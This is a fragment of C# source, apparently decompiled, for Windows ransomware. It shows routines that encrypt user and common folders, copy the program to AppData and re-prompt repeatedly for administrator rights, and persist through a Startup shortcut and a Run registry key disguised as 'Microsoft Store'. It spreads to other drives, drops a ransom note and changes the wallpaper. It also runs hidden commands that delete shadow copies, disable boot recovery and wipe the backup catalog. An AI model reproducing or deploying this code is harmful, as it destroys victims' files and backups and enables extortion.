		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
